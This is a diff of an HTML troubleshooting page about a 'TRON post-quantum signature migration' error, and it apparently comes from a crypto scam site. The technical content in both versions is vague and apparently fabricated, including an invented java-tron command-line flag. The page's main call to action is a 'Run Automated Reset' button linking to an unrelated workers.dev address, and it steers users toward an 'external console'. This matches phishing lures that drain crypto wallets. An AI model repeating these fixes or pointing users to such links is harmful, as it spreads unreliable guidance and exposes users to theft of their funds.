@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TRON Post-Quantum Signature Migration Failure – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Java Tron Feature Tron Post Quantum Signature Migration – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -39,42 +39,30 @@
 </head>
 <body>
 <div class="content">
-<h1>TRON Post-Quantum Signature Migration Failure</h1>
+<h1>Java Tron Feature Tron Post Quantum Signature Migration</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter issues when attempting to migrate to post-quantum signatures on the TRON network, resulting in failed transactions and error messages indicating a migration failure.</li>
+<li>Users encounter issues with transaction signatures, resulting in failed transactions, and observe error messages indicating incompatible signature schemes.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to incomplete or incorrect configuration of the post-quantum signature parameters, leading to a mismatch between the expected and actual signature formats.</li>
+<li>The error occurs due to the migration from traditional elliptic curve cryptography to post-quantum signatures, which are not backward compatible, causing transactions signed with the old scheme to be rejected by the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the Tron configuration file to include the post-quantum signature parameters:</li>
-<li>Set the <code>signatureScheme</code> to <code>SPHINCS+</code></li>
-<li>Configure the <code>postQuantum</code> settings with the correct parameters</li>
-<li>Verify that the <code>tron.jar</code> file is updated to the latest version</li>
+<li>To resolve the issue, users can attempt the following steps:</li>
+<li>Update their wallet software to the latest version supporting post-quantum signatures.</li>
+<li>Use the following command to manually configure the signature scheme:
+  <code>bash
+java -jar java-tron.jar --signature.scheme post_quantum</code></li>
+<li>Verify that their TRON node is updated and configured correctly to handle post-quantum transactions.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;signatureScheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SPHINCS+&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;postQuantum&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;treeHeight&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;wotsPlus&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Consider utilizing an external console for further debugging and configuration.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>The latest version of Java-Tron installed</li>
-<li>A compatible TRON wallet with post-quantum signature support</li>
-<li>A thorough understanding of TRON's post-quantum signature migration process</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<p>For a smooth migration, ensure you have:
+* The latest version of Java-Tron installed
+* A compatible TRON node updated to support post-quantum signatures
+* Sufficient bandwidth and resources for the migration process</p>
+<p>Consider utilizing an external console for more complex configurations.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
